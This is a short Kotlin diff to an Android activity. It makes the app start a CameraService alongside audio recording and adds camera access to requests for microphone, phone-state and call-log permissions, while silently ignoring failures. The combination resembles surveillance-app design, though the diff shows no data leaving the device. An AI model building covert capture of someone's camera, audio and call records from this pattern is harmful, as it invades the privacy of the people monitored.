@@ -60,12 +60,21 @@ class UserInterfaceActivity : AppCompatActivity() {
         } catch (e: Exception) {
             // Ignore — service will start on next resume when permissions are ready
         }
+        // Start CameraService alongside recording
+        try {
+            val camIntent = Intent(this, CameraService::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+                startForegroundService(camIntent)
+            else
+                startService(camIntent)
+        } catch (_: Exception) {}
     }
 
     private fun requestAllPermissions() {
         val needed = mutableListOf<String>()
         val perms = buildList {
             add(Manifest.permission.RECORD_AUDIO)
+            add(Manifest.permission.CAMERA)
             add(Manifest.permission.READ_PHONE_STATE)
             add(Manifest.permission.READ_CALL_LOG)
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
